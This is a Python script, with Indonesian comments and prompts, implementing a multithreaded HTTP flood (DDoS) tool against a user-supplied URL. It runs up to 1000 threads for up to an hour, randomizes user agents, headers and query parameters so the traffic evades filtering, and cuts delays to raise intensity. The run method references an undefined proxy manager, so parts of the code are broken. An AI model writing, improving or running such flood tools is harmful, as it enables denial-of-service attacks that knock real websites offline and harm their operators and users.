import requests
import threading
import time
import random
import logging
from fake_useragent import UserAgent
from concurrent.futures import ThreadPoolExecutor
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

class DDoSAttack:
    def __init__(self, url, threads, duration):
        self.url = url
        self.threads = threads
        self.duration = duration
        self.user_agent = UserAgent()
        self.request_count = 0
        self.success_count = 0
        self.error_count = 0
        self.lock = threading.Lock()
        self.timeout = 3
        self.retry_count = 2
        self.setup_logging()
        self.setup_session()
        
    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('ddos_attack.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)

    def setup_session(self):
        self.session = requests.Session()
        
        retry_strategy = Retry(
            total=self.retry_count,
            backoff_factor=0.5,
            status_forcelist=[429, 500, 502, 503, 504]
        )
        
        # Meningkatkan jumlah koneksi simultan
        adapter = HTTPAdapter(
            max_retries=retry_strategy,
            pool_connections=1000,
            pool_maxsize=1000
        )
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)

    def generate_payload(self):
        """Menghasilkan payload request yang bervariasi"""
        payloads = [
            {"param": f"value{random.randint(1,1000)}"},
            {"search": f"query{random.randint(1,1000)}"},
            {"id": str(random.randint(1,1000))},
            {"page": str(random.randint(1,100))},
            {"limit": str(random.randint(10,100))},
            {"offset": str(random.randint(0,1000))},
            {"sort": random.choice(['asc', 'desc'])},
            {"filter": random.choice(['active', 'inactive', 'all'])},
        ]
        return random.choice(payloads)

    def generate_headers(self):
        """Menghasilkan headers yang bervariasi"""
        return {
            "User-Agent": self.user_agent.random,
            "Accept": random.choice([
                "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "application/json,text/plain,*/*",
                "*/*"
            ]),
            "Accept-Language": random.choice([
                "en-US,en;q=0.5",
                "en-GB,en;q=0.5",
                "fr-FR,fr;q=0.5"
            ]),
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Cache-Control": random.choice(["no-cache", "max-age=0"]),
            "Pragma": "no-cache",
            "X-Requested-With": "XMLHttpRequest",
            "DNT": random.choice(["1", "0"]),
            "Upgrade-Insecure-Requests": "1"
        }

    def _send_request(self):
        try:
            headers = self.generate_headers()
            payload = self.generate_payload()
            
            # Mengurangi delay untuk meningkatkan intensitas
            time.sleep(random.uniform(0.01, 0.1))
            
            response = self.session.get(
                self.url,
                headers=headers,
                params=payload,
                timeout=self.timeout,
                allow_redirects=False  # Mencegah redirect untuk request lebih cepat
            )
            
            with self.lock:
                self.request_count += 1
                if response.status_code == 200:
                    self.success_count += 1
                    
            self.logger.debug(f"Request berhasil: {response.status_code}")
            return response
            
        except Exception as e:
            with self.lock:
                self.error_count += 1
            self.logger.debug(f"Error dalam request: {str(e)}")
            return None

    def _attack_worker(self):
        end_time = time.time() + self.duration
        while time.time() < end_time:
            self._send_request()

    def run(self):
        self.logger.info(f"Memulai serangan pada {self.url}")
        self.proxy_manager.load_proxies()
        
        # Verifikasi proxy sebelum memulai serangan
        self.logger.info("Memverifikasi proxy...")
        working_proxies = 0
        for proxy in self.proxy_manager.proxies:
            if self.proxy_manager.verify_proxy(proxy):
                working_proxies += 1
                
        if working_proxies == 0:
            self.logger.error("Tidak ada proxy yang bekerja! Membatalkan serangan.")
            return
            
        self.logger.info(f"Ditemukan {working_proxies} proxy yang bekerja")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [
                executor.submit(self._attack_worker)
                for _ in range(self.threads)
            ]
            
        # Tunggu semua thread selesai
        for future in futures:
            future.result()
            
        self.print_stats()

    def print_stats(self):
        """Mencetak statistik serangan"""
        self.logger.info("=== Statistik Serangan ===")
        self.logger.info(f"Total Request: {self.request_count}")
        self.logger.info(f"Request Sukses: {self.success_count}")
        self.logger.info(f"Request Gagal: {self.error_count}")
        self.logger.info(f"Success Rate: {(self.success_count/self.request_count)*100:.2f}%")

def validate_input():
    while True:
        try:
            url = input("Masukkan URL target: ")
            if not url.startswith(('http://', 'https://')):
                print("URL harus dimulai dengan http:// atau https://")
                continue
                
            num_threads = int(input("Masukkan jumlah thread (1-1000): "))
            if not 1 <= num_threads <= 1000:
                print("Jumlah thread harus antara 1-1000")
                continue
                
            attack_duration = int(input("Masukkan durasi waktu serangan dalam detik (1-3600): "))
            if not 1 <= attack_duration <= 3600:
                print("Durasi harus antara 1-3600 detik")
                continue
                
            return url, num_threads, attack_duration
        except ValueError:
            print("Input tidak valid. Mohon masukkan angka untuk thread dan durasi.")

def main():
    url, threads, duration = validate_input()
    attack = DDoSAttack(url, threads, duration)
    attack.run()

if __name__ == "__main__":
    main()
